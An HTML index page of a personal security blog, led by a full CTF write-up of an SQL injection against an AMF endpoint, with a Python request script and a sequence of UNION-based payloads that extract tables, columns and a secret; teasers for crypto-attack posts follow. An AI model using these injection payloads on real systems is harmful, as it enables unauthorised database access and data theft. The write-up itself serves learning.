<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Blog</title>
  <meta name="description" content="">

  
    <link href='//fonts.googleapis.com/css?family=Lato:400,400italic' rel='stylesheet' type='text/css'>
  

  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        extensions: ["tex2jax.js"],
        jax: ["input/TeX","output/HTML-CSS"],
        tex2jax: {inlineMath: [["$$","$$"],["\\(","\\)"]]}
      });
    </script>
    
      <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js' async></script>
    
  

  
    
      <script src='https://cdn.jsdelivr.net/npm/phaser@3.18.1/dist/phaser.min.js' ></script>
    
  

    
      <script src='https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.9.1/underscore-min.js' ></script>
    
  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/tufte.css">
  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/latex.css">

  <link rel="canonical" href="/book-of-gehn/">
</head>

  <body class="full-width">
    <header>
	
		<h1 class="header-title"><a href="/book-of-gehn/">The Book of Gehn</a></h1>
		
		
	

    

    
</header>

    <article>
        <h1 class="content-listing-header sans">Articles</h1>
  <ul class="content-listing ">
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2019/09/29/Writeup-EKO2019-Weirdo.html"><h2 class="larger">Weirdo (SQLi writeup - EKO 2019)</h2></a>
          <br><span class="smaller">September 29, 2019</span>  <br/>
          <div><p>Quick writeup of a SQL injection challenge.</p>

<!-- more -->
<p>We start with a
<a href="/book-of-gehn/assets/eko2019-writeups/weiro-dir/wtf.pcap">pcap</a>
of a HTTP communication between a client and a server.</p>

<p>It is only one request/response.</p>

<p>With <code class="highlighter-rouge">wireshark</code> we can see that the parties are talking using
<a href="https://en.wikipedia.org/wiki/Action_Message_Format">AMF</a></p>

<p>Here is the decoded <code class="highlighter-rouge">POST</code>:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hypertext Transfer Protocol
    POST / HTTP/1.1
    Content-type: application/x-amf
    Content-Length: 40
Action Message Format
    AMF version: 0
    Header count: 0
    Message count: 1
    Messages
        Target URI: EKO.CTF
        Response URI: /1
        Length: Unknown
        ECMA array (1 items)
            AMF0 type: ECMA array (0x08)
            Array length: 0
            Property 'q' String 'arg'
                Name: q
                    String length: 1
                    String: q
                String 'arg'
                    AMF0 type: String (0x02)
                    String length: 3
                    String: arg
            End Of Object Marker
</code></pre></div></div>

<h3 id="brief-amf-disassemble">Brief AMF Disassemble</h3>

<p>In particular, this is the hexdump of the AMF message:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0000   00 00 00 00 00 01 00 07 45 4b 4f 2e 43 54 46 00
0010   02 2f 31 ff ff ff ff 08 00 00 00 00 00 01 71 02
0020   00 03 61 72 67 00 00 09
</code></pre></div></div>

<p>From the end to the begin, the <code class="highlighter-rouge">00 00 09</code> is the
<code class="highlighter-rouge">End of Object Marker</code>, <code class="highlighter-rouge">02 00 03 61 72 67</code> is the
<code class="highlighter-rouge">arg</code> string, in ASCII prefixed with 2 bytes that
determines its length in big endian and all of that is
prefixed with on byte, <code class="highlighter-rouge">02</code> that says what follows is
a string.</p>

<p>I’m going to stop here as my understanding of AMF is quite
low and it deserves a separate post.</p>

<p>Playing with the value of the query, this <code class="highlighter-rouge">arg</code>, is all
what we need to get some fun.</p>

<p>Replacing <code class="highlighter-rouge">arg</code> with <code class="highlighter-rouge">'xx</code> we get a database error showing
that the server is vulnerable to a SQL injection.</p>

<p>So you know what I’m talking about.</p>

<h3 id="custom-queries">Custom Queries</h3>

<p>Before playing, we need a simple way to submit custom queries.</p>

<p>We treat the AMF message as an opaque string, the only thing
that we need is to inject an arbitrary string <code class="highlighter-rouge">q</code> prefixed
with its size.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">cryptonita</span> <span class="kn">import</span> <span class="n">B</span>

<span class="o">&gt;&gt;&gt;</span> <span class="n">hdr</span> <span class="o">=</span> <span class="s">'''
... 00 00 00 00 00 01 00 07 45 4b 4f 2e 43 54 46 00
... 02 2f 31 ff ff ff ff 08 00 00 00 00 00 01 71 02
... '''</span>

<span class="o">&gt;&gt;&gt;</span> <span class="n">hdr</span> <span class="o">=</span> <span class="n">B</span><span class="p">(</span><span class="n">hdr</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="mi">16</span><span class="p">)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">eom</span> <span class="o">=</span>  <span class="n">B</span><span class="p">(</span><span class="s">'00 00 09'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="mi">16</span><span class="p">)</span>

<span class="o">&gt;&gt;&gt;</span> <span class="k">def</span> <span class="nf">payload</span><span class="p">(</span><span class="n">q</span><span class="p">):</span>
<span class="o">...</span>     <span class="n">q</span>  <span class="o">=</span> <span class="n">B</span><span class="p">(</span><span class="n">q</span><span class="p">)</span>
<span class="o">...</span>     <span class="n">sz</span> <span class="o">=</span> <span class="n">B</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">q</span><span class="p">))</span>
<span class="o">...</span>
<span class="o">...</span>     <span class="n">sz</span> <span class="o">=</span> <span class="n">sz</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'&gt;H'</span><span class="p">)</span> <span class="c1"># uint16, big endian
</span><span class="o">...</span>     <span class="k">return</span> <span class="n">hdr</span> <span class="o">+</span> <span class="n">sz</span> <span class="o">+</span> <span class="n">q</span> <span class="o">+</span> <span class="n">eom</span>
</code></pre></div></div>

<p>We wrap this into a HTTP POST.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>

<span class="k">def</span> <span class="nf">post</span><span class="p">(</span><span class="n">q</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s">'https://wtf.eko.cap.tf/'</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">payload</span><span class="p">(</span><span class="n">q</span><span class="p">)</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">b</span><span class="s">'network'</span><span class="p">):</span>
        <span class="n">chunk</span> <span class="o">=</span> <span class="n">B</span><span class="p">([</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">chunk</span> <span class="k">if</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">.</span><span class="n">isprintable</span><span class="p">()])</span>
        <span class="k">print</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
</code></pre></div></div>

<p>The response is also a AMF message that we treat it as a binary blob.</p>

<p>For this reason we arbitrary split the response in chunks and we
filter out any non-printable char.</p>

<p>And <em>voila!</em> With <code class="highlighter-rouge">post</code> we can submit arbitrary queries and see their
responses.</p>

<h3 id="prologue-and-epilogue">Prologue and Epilogue</h3>

<p>We know that we are injecting in the middle of a SQL query but
we don’t know <em>where</em>.</p>

<p>We may be injecting here</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select ??? from ??? where ???='&lt;here&gt;' ;
</code></pre></div></div>

<p>but we may be injected here:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select ??? from ??? where ??? in (select ??? from ??? where ???='&lt;here&gt;' ???);
</code></pre></div></div>

<p>The possibilities are infinite.</p>

<p>If we <em>assume</em> the first case, we could try this:</p>

<ul>
  <li>a <em>prologue</em> of <code class="highlighter-rouge">'</code> to close the left side of the query</li>
  <li>a <em>epilogue</em> of <code class="highlighter-rouge">; --</code> to close the statement and ignore anything
on the right.</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; q = b"'; --"
</code></pre></div></div>

<p>The idea is that we transform the <em>host</em> query</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select ??? from ??? where ???='&lt;here&gt;';
</code></pre></div></div>

<p>into this:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select ??? from ??? where ???=''; --';
</code></pre></div></div>

<p>But we were wrong. It failed.</p>

<p>Perhaps we are in the wrong spot, perhaps one of our injected characters
were filtered or our prologue and/or epilogue is wrong.</p>

<p>The <code class="highlighter-rouge">--</code> begins a comment. Each SQL engine has its own. The <code class="highlighter-rouge">--</code> works
in Oracle and under <em>some</em> conditions in MySQL.</p>

<p>The <code class="highlighter-rouge">#</code> works only in MySQL without any condition so we could try that:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">q</span> <span class="o">=</span> <span class="n">b</span><span class="s">"'; #"</span>
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select ??? from ??? where ???=''; #';
</code></pre></div></div>

<p>And it worked! And we learnt that the database is a MySQL for free.</p>

<p><a href="http://www.sqlinjection.net/comments/">Ref</a></p>

<h3 id="deducing-the-host-query-structure">Deducing the Host Query Structure</h3>

<p>Under the hypothetical host query:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select ??? from ??? where ???='&lt;here&gt;';
</code></pre></div></div>

<p>We could learn how many <em>columns</em> is using the <code class="highlighter-rouge">select</code> making the
query to order the results by the, let’s say, the 10th column.</p>

<p>If it fails we now that it has less than 10 columns.</p>

<p>After some binary search, we learn that it has 5 columns:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">q</span> <span class="o">=</span> <span class="n">b</span><span class="s">"' order by 5 ;#"</span>    <span class="c1"># 5 columns
</span></code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select c1, c2, c3, c4, c5 from ??? where ???='' order by 5 ; #';
</code></pre></div></div>

<p>We can experiment further with:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">q</span> <span class="o">=</span> <span class="n">b</span><span class="s">"' union select 99, 98, 97, 96, 95 from information_schema.tables ;#"</span>
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select ??? from ??? where ???='' union select 99, 98, 97, 96, 95 from information_schema.tables ;#';
</code></pre></div></div>

<p>This also validates that the database engine is a MySQL (<code class="highlighter-rouge">information_schema</code>
is MySQL specific) and that we can <em>union</em> the results.</p>

<p>The last confirms that the host query is just a <code class="highlighter-rouge">select</code> and we are
injecting in the <code class="highlighter-rouge">where</code> clause.</p>

<h3 id="information-gathering">Information Gathering</h3>

<p>With this we can learn what other tables are in the database:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">q</span> <span class="o">=</span> <span class="n">b</span><span class="s">"' and 1=0 union select 99, table_name, 97, 96, 95 from information_schema.tables ;#"</span>
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select ??? from ??? where ???='' and 1=0 union select 99, table_name, 97, 96, 95 from information_schema.tables ;#';
</code></pre></div></div>

<p>And with this one we can learn what columns has the table <code class="highlighter-rouge">secret</code>, table that
found with the previous query and it has a interesting name.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">q</span> <span class="o">=</span> <span class="n">b</span><span class="s">"' and 1=0 union select 99, column_name, 97, 96, 95 from information_schema.columns where table_name='secret' ;#"</span>
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select ??? from ??? where ???='' and 1=0 union select 99, column_name, 97, 96, 95 from information_schema.columns where table_name='secret' ;#';
</code></pre></div></div>

<p>In both cases the <code class="highlighter-rouge">and 1=0</code> makes the <em>host</em> query to produce zero results
and it makes the output much cleaner.</p>

<h3 id="profit">Profit!</h3>

<p>Finally:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">q</span> <span class="o">=</span> <span class="n">b</span><span class="s">"' and 1=0 union 99, secret, 97, 96, 95 FROM secrets ;#"</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">post</span><span class="p">(</span><span class="n">q</span><span class="p">)</span>
<span class="o">&lt;...&gt;</span>
<span class="n">EKO</span><span class="p">{</span> <span class="n">this</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">flag</span> <span class="p">}</span>
<span class="o">&lt;...&gt;</span>
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select ??? from ??? where ???='' and 1=0 union 99, secret, 97, 96, 95 FROM secrets ;#';
</code></pre></div></div>
</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2019/08/22/CTR-Bitfliping.html"><h2 class="larger">CTR Bitflipping</h2></a>
          <br><span class="smaller">August 22, 2019</span>  <br/>
          <div><p>No much to explain: encryption <strong>does not</strong> offer any
protection against forgery.</p>

<p>We saw this in the <a href="/book-of-gehn/articles/2018/07/03/CBC-Bitflipping.html">CBC Bitflipping post</a>
and we will see it again here but this time it will be
the CTR encryption mode our victim.<label for="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle" /><span class="sidenote"><strong>– Spoiler Alert! –</strong></span></p>

</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2019/08/04/Better-Compression-Log-Files-PoC.html"><h2 class="larger">Better Compression of Log Files (PoC)</h2></a>
          <br><span class="smaller">August 4, 2019</span>  <br/>
          <div><p>The logs present several patterns that are repeated again and again;
LZMA takes advantage of that and reaches very high compress ratios.</p>

<p>Doing a quick test, LZMA at the 6 level of compression, compressed
a 2.5 GB log into 147 MB very tight binary blog. A ratio of 94.069%,
not bad!</p>

<p>But could we get better results?</p>

</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2019/07/25/From-Regex-to-Nondeterministic-Finite-Automata.html"><h2 class="larger">From a Regex to a Nondeterministic Finite Automata</h2></a>
          <br><span class="smaller">July 25, 2019</span>  <br/>
          <div><p>Before building complex state machine we need to learn the basics blocks.</p>

<p>When the solution to a problem can be seen as set of states with
transitions from ones to others, modeling them as a nondeterministic
finite automatas makes clear how the solution works and allows to spot
deficiencies.</p>

<p>A regular expression is an example of this. As an introductory step
let’s review how to turn a regex into a NFA.</p>

<p>Take at look of the <a href="https://github.com/eldipa/nfa">source code in Github</a>.</p>

</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2019/05/08/CTR-Edit-Inject-Plaintext-Attacks.html"><h2 class="larger">CTR Edit/Inject Plaintext Attacks</h2></a>
          <br><span class="smaller">May 8, 2019</span>  <br/>
          <div><p>A CTR-mode cipher turns a block cipher into a stream cipher.</p>

<p>With this, a ciphertext can be edited <em>in place</em> generating
enough of the key stream, decrypting and re-encrypting the edited
portion.</p>

<p>One can replace part of the plaintext, extend it or even reduce it.</p>

<p>But this beautiful property of a CTR mode (and any other stream cipher)
is actually a booby-trap.</p>

</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2019/03/20/Affine-Ciphers.html"><h2 class="larger">Affine Cipher</h2></a>
          <br><span class="smaller">March 20, 2019</span>  <br/>
          <div><p>A <em>linear</em> cipher like the Hill Cipher is
<a href="/book-of-gehn/articles/2019/01/02/Break-Hill-Cipher-with-a-Known-Plaintext-Attack.html">vulnerable</a>
to a known plaintext attack: just resolve a set of linear
equations and get the secret key.</p>

<p>An <em>affine</em> cipher is a little harder to break, however it could
be vulnerable to a <em>differential</em> attack.</p>

</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2019/03/15/Separate-your-SSH-Agent-Identities.html"><h2 class="larger">Separate your SSH Agent Identities</h2></a>
          <br><span class="smaller">March 15, 2019</span>  <br/>
          <div><p>Using a <code class="highlighter-rouge">ssh-agent</code> to handle our keys is handy.</p>

<p>When you need to access to different hosts jumping from one to another,
<em>forwarding</em> the agent is much more secure than copying and pasting
your keys around.</p>

<p>But if one host gets compromised it will expose your agent: even if the
attacker will not get your secret keys he will be able to login into
any system as you.</p>

<p>You cannot prevent this, but you can restrict this to reduce the splash
damage.</p>

</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2019/02/03/Cape-Encryption.html"><h2 class="larger">Cape Encryption</h2></a>
          <br><span class="smaller">February 3, 2019</span>  <br/>
          <div><p>The Cape library<label for="sn-4bc32159a5b520259ac8bbc444bdd485" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-4bc32159a5b520259ac8bbc444bdd485" class="margin-toggle" /><span class="sidenote">https://github.com/gioblu/Cape/tree/294f810ac4831af26832e70e4ba5d073908232e2</span>
offers a symmetric stream cipher implemented in
<code class="highlighter-rouge">cape_decrypt</code> and <code class="highlighter-rouge">cape_encrypt</code>.</p>

<p>In addition, it offers another symmetric stream cipher, a slightly different
of the first one, implemented in <code class="highlighter-rouge">cape_hash</code><label for="sn-07e3f75f5385a05dda74ee8bdc043d42" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-07e3f75f5385a05dda74ee8bdc043d42" class="margin-toggle" /><span class="sidenote"><code class="highlighter-rouge">cape_hash</code> is an unfortunately name for a cipher.</span></p>

<p>In this write-up we are going to analyze the <code class="highlighter-rouge">cape_hash</code> stream cipher
and see if we can break it.</p>

</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2019/01/02/Break-Hill-Cipher-with-a-Known-Plaintext-Attack.html"><h2 class="larger">Break Hill Cipher with a Known Plaintext Attack</h2></a>
          <br><span class="smaller">January 2, 2019</span>  <br/>
          <div><p>Given a matrix secret key <script type="math/tex">K</script> with shape <script type="math/tex">n\textrm{x}n</script>, the
<a href="https://en.wikipedia.org/wiki/Hill_cipher">Hill cipher</a> splits
the plaintext into blocks of length <script type="math/tex">n</script> and for each block, computes
the ciphertext block doing a linear transformation in module <script type="math/tex">m</script></p>

<script type="math/tex; mode=display">K p_i = c_i\quad(\textrm{mod } m)</script>

<p>For decrypting, we apply the inverse of <script type="math/tex">K</script></p>

<script type="math/tex; mode=display">p_i = [K]^{-1} c_i \quad(\textrm{mod } m)</script>

<p>To make sense, the secret key <script type="math/tex">K</script> must be chosen such as its inverse
exists in module <script type="math/tex">m</script>.</p>

<p>Ready to break it?</p>

</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2018/12/23/Mersenne-Twister-PRNG.html"><h2 class="larger">Breaking MT19937 Crypto</h2></a>
          <br><span class="smaller">December 23, 2018</span>  <br/>
          <div><p>The Mersenne-Twister 19937 or just MT19937 is one of the most
used pseudo random number generator with a quite large cycle length
and with a nice random quality.</p>

<p>However it was not designed to be used for crypto.</p>

<p>But some folks may not know this…<label for="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle" /><span class="sidenote"><strong>– Spoiler Alert! –</strong></span></p>

</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2018/12/04/Fixed-Nonce-CTR-Attack.html"><h2 class="larger">Fixed Nonce CTR Attack</h2></a>
          <br><span class="smaller">December 4, 2018</span>  <br/>
          <div><p>The Counter mode, or just CTR mode, turns a block cipher into a stream cipher.</p>

<p>More specifically, it builds a pseudo random generator (PRG)
from a block cipher and then generates a random string using
the PRG to encrypt/decrypt the payload performing a simple xor.</p>

<p>The idea is to initialize the PRG with a different <em>seed</em> each time
but if this does not happen, all the plaintexts will be encrypted
with the <em>same</em> pseudo random key stream – totally insecure.</p>

<p>Ready to break it?<label for="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle" /><span class="sidenote"><strong>– Spoiler Alert! –</strong></span></p>

</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2018/10/28/CBC-Padding-Oracle.html"><h2 class="larger">CBC Padding Oracle Attack</h2></a>
          <br><span class="smaller">October 28, 2018</span>  <br/>
          <div><p>AES and other ciphers work on blocks; if the plaintext length
is not multiple of the block size a padding is added.</p>

<p>If during the decryption the pad is checked and returns an error,
we can use this to build a <em>padding oracle</em>:
a function that will tell us if an encrypted plaintext
has a valid pad or not.</p>

<p>Armed with this <em>padding oracle</em> we can break CBC
one byte at time.</p>

<p>Ready?<label for="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle" /><span class="sidenote"><strong>– Spoiler Alert! –</strong></span> <em>Go!</em></p>

</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2018/10/01/Magic-Bash-Runes.html"><h2 class="larger">() { Magic Bash Runes</h2></a>
          <br><span class="smaller">October 1, 2018</span>  <br/>
          <div><p>Despite of been 4 years old, <code class="highlighter-rouge">Shellshock</code> is still a very interesting
topic to me not for the vulnerability itself but for the large
ways to trigger it even in the most unexpected places.</p>

<p>Take the 4 characters <code class="highlighter-rouge">() {</code> and open the world.
<label for="mf-f40ce0988735db556d111316cae05d24" class="margin-toggle">⊕</label><input type="checkbox" id="mf-f40ce0988735db556d111316cae05d24" class="margin-toggle" /><span class="marginnote"><img class="fullwidth" alt="Fragments found in the field." src="/book-of-gehn/assets/shellshock/runes.png" />  <br /></span></p>

<p>Creativity and few hours reading man pages are all what you need.</p>

</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2018/09/16/Ouroboros-Circular-Buffer.html"><h2 class="larger">Ouroboros - Circular Buffer</h2></a>
          <br><span class="smaller">September 16, 2018</span>  <br/>
          <div><p><code class="highlighter-rouge">struct circular_buffer</code> is a simple but quite efficient implementation
of a circular buffer over a continuous and finite memory slice.</p>

<p>The name <a href="https://en.wikipedia.org/wiki/Ouroboros">Ouroboros</a> comes from the
Ancient Greek and symbolize a snake eating
its own tail – a convenient image for a circular buffer.</p>

<p>Source code can be found in the
<a href="https://github.com/eldipa/tiburoncin">tiburoncin project</a>. Enjoy it!</p>

</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2018/07/03/CBC-Bitflipping.html"><h2 class="larger">CBC Bitflipping</h2></a>
          <br><span class="smaller">July 3, 2018</span>  <br/>
          <div><p>CBC does not offer any protection against an active attacker.</p>

<p>Flipping some bits in a ciphertext block totally scrambles its
plaintext but it has a very specific effect in the <em>next</em> plaintext
block.</p>

<p>Without any message integrity, a CBC ciphertext can be patched
to modify the plaintext at will.<label for="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle" /><span class="sidenote"><strong>– Spoiler Alert! –</strong></span></p>

</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2018/07/01/Cut-and-Paste-ECB-Blocks.html"><h2 class="larger">Cut and Paste ECB blocks</h2></a>
          <br><span class="smaller">July 1, 2018</span>  <br/>
          <div><p>In this game we control partially a plaintext that is encrypted
under ECB mode with a secret key.</p>

<p>This time the idea is not to reveal the key but to <em>forge</em> a plaintext.</p>

<p>Welcome to the <a href="https://cryptopals.com/sets/2/challenges/13">ECB cut-and-paste</a>
challenge!<label for="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle" /><span class="sidenote"><strong>– Spoiler Alert! –</strong></span></p>

</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2018/06/10/Breaking-ECB.html"><h2 class="larger">Breaking ECB</h2></a>
          <br><span class="smaller">June 10, 2018</span>  <br/>
          <div><p>In this post I will show how to use
<a href="https://cryptopals.com/sets/2/challenges/11">an ECB/CBC detection oracle</a>
to break ECB,
<a href="https://cryptopals.com/sets/2/challenges/14">one byte at time</a>,
using
<a href="https://pypi.org/project/cryptonita/">cryptonita</a><label for="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle" /><span class="sidenote"><strong>– Spoiler Alert! –</strong></span>.</p>

</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2018/05/20/Detecting-Pinguins.html"><h2 class="larger">Detecting Pinguins</h2></a>
          <br><span class="smaller">May 20, 2018</span>  <br/>
          <div><p>Can you see the pinguin?<label for="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle" /><span class="sidenote"><strong>– Spoiler Alert! –</strong></span></p>

</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2018/05/01/Breaking-Vigenere.html"><h2 class="larger">Breaking Vigenere</h2></a>
          <br><span class="smaller">May 1, 2018</span>  <br/>
          <div><p>A plaintext was encrypted via a XOR with key of unknown bytes of length,
repeating this key as much as needed to cover the full length of
the plaintext.</p>

<p>This is also known as the
<a href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher">Vigenere cipher</a>.</p>

<p>It is 101 cipher, which it is easy to break in theory, but it has more than
one challenge hidden to be resolve in the practice.</p>

<p>Shall we?<label for="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle" /><span class="sidenote"><strong>– Spoiler Alert! –</strong></span></p>

</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2018/04/01/A-string-of-coincidences-is-not-a-coincidence.html"><h2 class="larger">A string of coincidences is not a coincidence</h2></a>
          <br><span class="smaller">April 1, 2018</span>  <br/>
          <div><p>A cipher is <em>semantically secure</em> if given a randomly chosen key, its ciphertext
cannot be distinguishable from a truly random string.</p>

<p>Detecting a ciphertext from a pool is enough to consider
the cipher as not secure even of we can’t break it.</p>

<p>In the following pool of random strings one is actually a ciphertext
that is the <code class="highlighter-rouge">xor</code> encryption of a plaintext using a single-byte key.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">cryptonita</span> <span class="kn">import</span> <span class="n">B</span><span class="p">,</span> <span class="n">load_bytes</span>     <span class="c1"># byexample: +timeout=10
</span><span class="o">&gt;&gt;&gt;</span> <span class="n">ciphertexts</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">load_bytes</span><span class="p">(</span><span class="s">'./assets/matasano/4.txt'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="mi">16</span><span class="p">))</span>

<span class="o">&gt;&gt;&gt;</span> <span class="n">methods</span> <span class="o">=</span> <span class="p">{}</span>
</code></pre></div></div>

<p>This is obviously a poor and not secure encryption mechanism; let’s find
the ciphertext then!<label for="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle" /><span class="sidenote"><strong>– Spoiler Alert! –</strong></span></p>

</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2018/03/01/In-XOR-We-Trust.html"><h2 class="larger">In XOR we trust</h2></a>
          <br><span class="smaller">March 1, 2018</span>  <br/>
          <div><p>This is the first set of exercises for the
<a href="https://cryptopals.com/">Matasano Challenge</a> (also known as
the Cryptopals Challenge)</p>

<p>It starts from the very begin, really easy, but it goes up to more
challenging exercises quickly.</p>

<p>Ready?<label for="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-92c40aed2262db60522dbf16855f07d8" class="margin-toggle" /><span class="sidenote"><strong>– Spoiler Alert! –</strong></span> <em>Go!</em></p>

</div>
        </li>
    
        <li class="listing">
          <hr class="slender">
          <a href="/book-of-gehn/articles/2017/04/16/Isolate-wifi-and-keep-traffic-out-Big-Brother-sight.html"><h2 class="larger">Isolate a wifi card and keep your traffic out of the Big Brother sight</h2></a>
          <br><span class="smaller">April 16, 2017</span>  <br/>
          <div><p>HTTP Proxies blacklisting evil domains, firewalls blocking weird traffic
and IDSs looking for someone that shouldn’t be there are reasonable and
understandable policies for a corporate environment.</p>

<p>But when a friend opened his browser this week and went to <code class="highlighter-rouge">google.com</code>
the things got odd.</p>

<p>The browser refused the connection warning him that the SSL certificate
of the server wasn’t issue by <code class="highlighter-rouge">google.com</code> at all or signed by a
trusted authority.</p>

